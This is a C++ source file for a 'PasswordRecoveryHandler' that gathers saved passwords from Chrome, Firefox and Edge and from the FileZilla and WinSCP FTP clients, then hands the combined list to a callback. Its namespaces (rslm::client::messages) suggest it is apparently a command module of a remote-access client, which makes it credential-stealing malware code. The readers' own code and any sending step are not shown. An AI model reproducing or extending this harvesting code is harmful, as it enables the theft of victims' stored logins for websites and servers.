#include "PasswordRecoveryHandler.h"
#include "ChromePassReader.h"
#include "FirefoxPassReader.h"
#include "EdgePassReader.h"
#include "FileZillaPassReader.h"
#include "WinScpPassReader.h"

namespace rslm {
    namespace client {
        namespace messages {

            void PasswordRecoveryHandler::RecoverBrowsers(PasswordCallback callback) {
                std::vector<RecoveredPassword> all;

                recovery::ChromePassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });
                recovery::FirefoxPassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });
                recovery::EdgePassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });

                if (callback) callback(all);
            }

            void PasswordRecoveryHandler::RecoverFtpClients(PasswordCallback callback) {
                std::vector<RecoveredPassword> all;

                recovery::FileZillaPassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });
                recovery::WinScpPassReader::ReadPasswords([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });

                if (callback) callback(all);
            }

            void PasswordRecoveryHandler::RecoverAll(PasswordCallback callback) {
                std::vector<RecoveredPassword> all;

                RecoverBrowsers([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });
                RecoverFtpClients([&all](const std::vector<RecoveredPassword>& p) {
                    all.insert(all.end(), p.begin(), p.end());
                    });

                if (callback) callback(all);
            }

        } // namespace messages
    } // namespace client
} // namespace rslm